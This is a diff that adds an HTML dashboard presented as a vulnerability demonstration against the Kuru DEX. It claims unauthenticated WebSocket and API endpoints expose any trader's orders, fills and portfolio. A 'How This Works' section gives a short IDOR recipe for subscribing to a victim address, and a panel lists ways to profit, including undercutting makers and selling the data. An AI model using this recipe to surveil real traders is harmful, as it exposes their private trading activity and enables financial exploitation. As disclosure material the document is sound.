@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kuru DEX Intelligence — LIVE</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            background: #0a0a0f;
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #1a0a2e 0%, #0d1117 100%);
+            border-bottom: 1px solid #ff3333;
+            padding: 20px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header h1 {
+            font-size: 1.4rem;
+            color: #ff3333;
+            letter-spacing: 2px;
+        }
+        .header .subtitle {
+            font-size: 0.75rem;
+            color: #666;
+            margin-top: 4px;
+        }
+        .live-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.8rem;
+            color: #00ff88;
+        }
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #00ff88;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .warning-banner {
+            background: #1a0000;
+            border: 1px solid #ff3333;
+            border-left: 4px solid #ff3333;
+            padding: 12px 20px;
+            margin: 15px 20px;
+            font-size: 0.8rem;
+            color: #ff6666;
+        }
+        .warning-banner strong { color: #ff3333; }
+
+        .stats-bar {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 12px;
+            padding: 15px 20px;
+        }
+        .stat-card {
+            background: #111118;
+            border: 1px solid #222;
+            border-radius: 6px;
+            padding: 14px;
+            text-align: center;
+        }
+        .stat-card .value {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #00ff88;
+        }
+        .stat-card .label {
+            font-size: 0.7rem;
+            color: #666;
+            margin-top: 4px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .stat-card.danger .value { color: #ff3333; }
+
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            padding: 0 20px 20px;
+        }
+
+        .panel {
+            background: #111118;
+            border: 1px solid #222;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        .panel-header {
+            background: #1a1a24;
+            padding: 12px 16px;
+            border-bottom: 1px solid #222;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .panel-header h2 {
+            font-size: 0.85rem;
+            color: #aaa;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .panel-header .count {
+            font-size: 0.75rem;
+            color: #00ff88;
+            background: #0a2a1a;
+            padding: 2px 8px;
+            border-radius: 10px;
+        }
+        .panel-body {
+            padding: 16px;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+
+        .maker-card {
+            background: #0a0a12;
+            border: 1px solid #1a1a2e;
+            border-radius: 6px;
+            padding: 14px;
+            margin-bottom: 12px;
+            transition: border-color 0.2s;
+        }
+        .maker-card:hover { border-color: #ff3333; }
+        .maker-card .address {
+            font-size: 0.8rem;
+            color: #00ff88;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+        .maker-card .portfolio-val {
+            font-size: 1.2rem;
+            color: #fff;
+            font-weight: bold;
+        }
+        .maker-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-top: 10px;
+        }
+        .maker-stat {
+            text-align: center;
+            padding: 6px;
+            background: #111;
+            border-radius: 4px;
+        }
+        .maker-stat .val {
+            font-size: 0.9rem;
+            color: #fff;
+        }
+        .maker-stat .lbl {
+            font-size: 0.6rem;
+            color: #555;
+            text-transform: uppercase;
+        }
+        .token-list {
+            margin-top: 8px;
+            font-size: 0.75rem;
+            color: #888;
+        }
+        .token-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 2px 0;
+            border-bottom: 1px solid #1a1a1a;
+        }
+        .token-row .ticker { color: #aaa; }
+        .token-row .usd { color: #00cc66; }
+
+        .markets-badges {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px;
+            margin-top: 8px;
+        }
+        .market-badge {
+            font-size: 0.65rem;
+            background: #1a0a2e;
+            color: #9966ff;
+            padding: 2px 6px;
+            border-radius: 3px;
+            border: 1px solid #333;
+        }
+
+        .event-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 6px 0;
+            border-bottom: 1px solid #1a1a1a;
+            font-size: 0.75rem;
+        }
+        .event-row .time { color: #555; width: 50px; flex-shrink: 0; }
+        .event-row .maker-tag {
+            color: #00ff88;
+            font-size: 0.7rem;
+            width: 90px;
+            flex-shrink: 0;
+        }
+        .event-row .evt-type {
+            padding: 1px 6px;
+            border-radius: 3px;
+            font-size: 0.65rem;
+            font-weight: bold;
+            width: 100px;
+            text-align: center;
+            flex-shrink: 0;
+        }
+        .evt-type.OrderCreated { background: #0a2a1a; color: #00cc66; }
+        .evt-type.OrderCanceled { background: #2a1a0a; color: #ff9933; }
+        .evt-type.BalanceUpdate { background: #0a1a2a; color: #3399ff; }
+        .evt-type.Trade { background: #2a0a2a; color: #ff33ff; }
+        .event-row .market-name { color: #666; }
+
+        .full-width { grid-column: 1 / -1; }
+
+        .exploitation-panel {
+            background: #1a0000;
+            border: 1px solid #ff3333;
+        }
+        .exploitation-panel .panel-header {
+            background: #2a0000;
+            border-bottom: 1px solid #ff3333;
+        }
+        .exploitation-panel .panel-header h2 { color: #ff3333; }
+        .exploit-item {
+            padding: 12px;
+            border-bottom: 1px solid #220000;
+        }
+        .exploit-item h3 {
+            font-size: 0.85rem;
+            color: #ff6666;
+            margin-bottom: 4px;
+        }
+        .exploit-item p {
+            font-size: 0.75rem;
+            color: #aa6666;
+            line-height: 1.5;
+        }
+        .exploit-item .revenue {
+            font-size: 1rem;
+            color: #ff3333;
+            font-weight: bold;
+            margin-top: 6px;
+        }
+
+        .how-section {
+            background: #0a0a1a;
+            border: 1px solid #333366;
+            border-radius: 6px;
+            padding: 16px;
+            margin-top: 12px;
+            font-size: 0.75rem;
+        }
+        .how-section h4 { color: #6666ff; margin-bottom: 8px; }
+        .how-section code {
+            display: block;
+            background: #000;
+            padding: 10px;
+            border-radius: 4px;
+            color: #00ff88;
+            margin-top: 8px;
+            overflow-x: auto;
+            white-space: pre;
+        }
+
+        @media (max-width: 900px) {
+            .main-grid { grid-template-columns: 1fr; }
+            .stats-bar { grid-template-columns: repeat(3, 1fr); }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div>
+            <h1>KURU DEX INTELLIGENCE</h1>
+            <div class="subtitle">Real-time market maker surveillance — zero authentication required</div>
+        </div>
+        <div class="live-badge">
+            <div class="live-dot"></div>
+            <span>LIVE — <span id="uptime">0s</span></span>
+        </div>
+    </div>
+
+    <div class="warning-banner">
+        <strong>VULNERABILITY DEMONSTRATION:</strong> All data on this dashboard is collected from
+        <code>wss://ws.kuru.io</code> and <code>api.kuru.io</code> without any authentication.
+        Any user's trading activity, portfolio, and strategy is fully exposed.
+    </div>
+
+    <div class="stats-bar">
+        <div class="stat-card danger">
+            <div class="value" id="stat-makers">0</div>
+            <div class="label">Makers Exposed</div>
+        </div>
+        <div class="stat-card">
+            <div class="value" id="stat-tvl">$0</div>
+            <div class="label">Total TVL Observed</div>
+        </div>
+        <div class="stat-card">
+            <div class="value" id="stat-events">0</div>
+            <div class="label">Events Captured</div>
+        </div>
+        <div class="stat-card">
+            <div class="value" id="stat-mid">$0</div>
+            <div class="label">MON/USDC Mid</div>
+        </div>
+        <div class="stat-card">
+            <div class="value" id="stat-fills">0</div>
+            <div class="label">Fills Observed</div>
+        </div>
+    </div>
+
+    <div class="main-grid">
+        <div class="panel">
+            <div class="panel-header">
+                <h2>Maker Profiles</h2>
+                <span class="count" id="maker-count">0 tracked</span>
+            </div>
+            <div class="panel-body" id="makers-container">
+                <div style="color: #555; text-align: center; padding: 40px;">
+                    Discovering makers...
+                </div>
+            </div>
+        </div>
+
+        <div class="panel">
+            <div class="panel-header">
+                <h2>Live Event Feed</h2>
+                <span class="count" id="feed-count">0 events</span>
+            </div>
+            <div class="panel-body" id="events-container">
+                <div style="color: #555; text-align: center; padding: 40px;">
+                    Waiting for events...
+                </div>
+            </div>
+        </div>
+
+        <div class="panel full-width exploitation-panel">
+            <div class="panel-header">
+                <h2>Exploitation Scenarios — What An Attacker Does With This</h2>
+            </div>
+            <div class="panel-body" style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; max-height: none;">
+                <div class="exploit-item">
+                    <h3>A) Strategy Clone + Undercut</h3>
+                    <p>Copy maker's exact timing and spread. Set yours 0.5bps tighter. Steal their order flow.</p>
+                    <div class="revenue">~$86/day</div>
+                    <p style="margin-top: 4px;">Capital: $50K | Risk: Low</p>
+                </div>
+                <div class="exploit-item">
+                    <h3>B) Stale Quote Sniping</h3>
+                    <p>Monitor CEX price during maker's refresh window. Hit stale quotes when price diverges.</p>
+                    <div class="revenue">~$200/day</div>
+                    <p style="margin-top: 4px;">Capital: $10K | Risk: Medium</p>
+                </div>
+                <div class="exploit-item">
+                    <h3>C) Intelligence Product (SaaS)</h3>
+                    <p>Package this exact dashboard as a paid feed. Sell to quant funds, competing DEXs, VCs.</p>
+                    <div class="revenue">$25-50K/month</div>
+                    <p style="margin-top: 4px;">Capital: $0 | Risk: None</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="panel full-width">
+            <div class="panel-header">
+                <h2>How This Works — The Vulnerability</h2>
+            </div>
+            <div class="panel-body" style="max-height: none;">
+                <div class="how-section">
+                    <h4>Step 1: Connect to WebSocket (no auth)</h4>
+                    <code>ws = websockets.connect("wss://ws.kuru.io")</code>
+                </div>
+                <div class="how-section">
+                    <h4>Step 2: Subscribe to ANY user's private activity (IDOR)</h4>
+                    <code>await ws.send(json.dumps({
+    "type": "subscribe",
+    "channel": "user",
+    "address": "0xVICTIM_ADDRESS"  // any address, no auth
+}))</code>
+                </div>
+                <div class="how-section">
+                    <h4>Step 3: Receive their orders, cancels, fills, and balance changes in real-time</h4>
+                    <code>// You now see:
+// - Every order they place (price, size, direction)
+// - Every cancellation (reveals strategy adjustments)
+// - Every fill (reveals their P&L)
+// - Every balance change (reveals their full portfolio)</code>
+                </div>
+                <div class="how-section">
+                    <h4>Step 4: Enrich with API (also no auth)</h4>
+                    <code>GET https://api.kuru.io/api/v2/margin/balances/{ANY_ADDRESS}
+// Returns: full token breakdown with balances
+// No authentication. No rate limiting. CORS: *</code>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const POLL_INTERVAL = 2000;
+
+        function formatUSD(val) {
+            if (val >= 1000000) return '$' + (val / 1000000).toFixed(1) + 'M';
+            if (val >= 1000) return '$' + (val / 1000).toFixed(1) + 'K';
+            return '$' + val.toFixed(0);
+        }
+
+        function formatTime(ts) {
+            const d = new Date(ts * 1000);
+            return d.toLocaleTimeString('en-US', { hour12: false });
+        }
+
+        function renderMakers(makers) {
+            const container = document.getElementById('makers-container');
+            const sorted = Object.values(makers).sort((a, b) => b.portfolio_usd - a.portfolio_usd);
+
+            if (sorted.length === 0) {
+                container.innerHTML = '<div style="color:#555;text-align:center;padding:40px;">Discovering makers...</div>';
+                return;
+            }
+
+            container.innerHTML = sorted.map(maker => {
+                const tokens = Object.entries(maker.portfolio || {}).map(([ticker, data]) =>
+                    `<div class="token-row"><span class="ticker">${ticker}</span><span class="usd">${formatUSD(data.usd)}</span></div>`
+                ).join('');
+
+                const markets = (maker.markets_active || []).map(m =>
+                    `<span class="market-badge">${m}</span>`
+                ).join('');
+
+                return `
+                    <div class="maker-card">
+                        <div class="address">${maker.address}</div>
+                        <div class="portfolio-val">${formatUSD(maker.portfolio_usd)}</div>
+                        <div class="maker-stats">
+                            <div class="maker-stat">
+                                <div class="val">${maker.refresh_rate_ms}ms</div>
+                                <div class="lbl">Refresh</div>
+                            </div>
+                            <div class="maker-stat">
+                                <div class="val">${maker.spread_bps.toFixed(1)}bps</div>
+                                <div class="lbl">Spread</div>
+                            </div>
+                            <div class="maker-stat">
+                                <div class="val">${maker.fills}</div>
+                                <div class="lbl">Fills</div>
+                            </div>
+                        </div>
+                        <div class="token-list">${tokens}</div>
+                        ${markets ? `<div class="markets-badges">${markets}</div>` : ''}
+                    </div>
+                `;
+            }).join('');
+        }
+
+        function renderEvents(events) {
+            const container = document.getElementById('events-container');
+            if (!events || events.length === 0) {
+                container.innerHTML = '<div style="color:#555;text-align:center;padding:40px;">Waiting for events...</div>';
+                return;
+            }
+
+            container.innerHTML = events.slice().reverse().slice(0, 50).map(ev => `
+                <div class="event-row">
+                    <span class="time">${formatTime(ev.time)}</span>
+                    <span class="maker-tag">${ev.maker}...</span>
+                    <span class="evt-type ${ev.type}">${ev.type}</span>
+                    <span class="market-name">${ev.market || ''}</span>
+                </div>
+            `).join('');
+        }
+
+        async function poll() {
+            try {
+                const resp = await fetch('/api/state');
+                const data = await resp.json();
+
+                // Stats
+                document.getElementById('stat-makers').textContent = data.stats.makers_discovered;
+                document.getElementById('stat-tvl').textContent = formatUSD(data.stats.total_tvl_observed);
+                document.getElementById('stat-events').textContent = data.stats.total_events.toLocaleString();
+                document.getElementById('stat-mid').textContent = '$' + (data.orderbook.mid || 0).toFixed(6);
+
+                const totalFills = Object.values(data.makers).reduce((s, m) => s + m.fills, 0);
+                document.getElementById('stat-fills').textContent = totalFills;
+
+                const uptime = Math.floor(data.stats.uptime_seconds);
+                const mins = Math.floor(uptime / 60);
+                const secs = uptime % 60;
+                document.getElementById('uptime').textContent = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
+
+                document.getElementById('maker-count').textContent = `${Object.keys(data.makers).length} tracked`;
+                document.getElementById('feed-count').textContent = `${data.events_log.length} events`;
+
+                renderMakers(data.makers);
+                renderEvents(data.events_log);
+            } catch (e) {
+                console.error('Poll failed:', e);
+            }
+        }
+
+        setInterval(poll, POLL_INTERVAL);
+        poll();
+    </script>
+</body>
+</html>
